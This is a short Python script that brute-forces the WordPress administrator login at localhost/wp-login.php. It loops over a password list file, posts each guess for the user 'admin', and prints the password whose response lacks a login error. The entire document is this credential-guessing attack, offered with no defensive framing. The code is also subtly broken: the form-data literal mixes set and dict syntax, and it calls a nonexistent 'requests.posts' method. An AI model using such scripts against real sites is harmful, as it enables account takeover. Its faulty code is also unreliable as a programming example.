import requests

address = 'http://localhost/wp-login.php'

passwordfile = open("password.txt","r")

for line in passwordfile:
  data_dict = {"log","admin","pwd":line.strip(),"Login":"submit"}
  response = requests.posts(address, data=data_dict)
  if "login_error" in str(response.content):
    pass
  else:
    print("password is "+line)
    print(response.content)

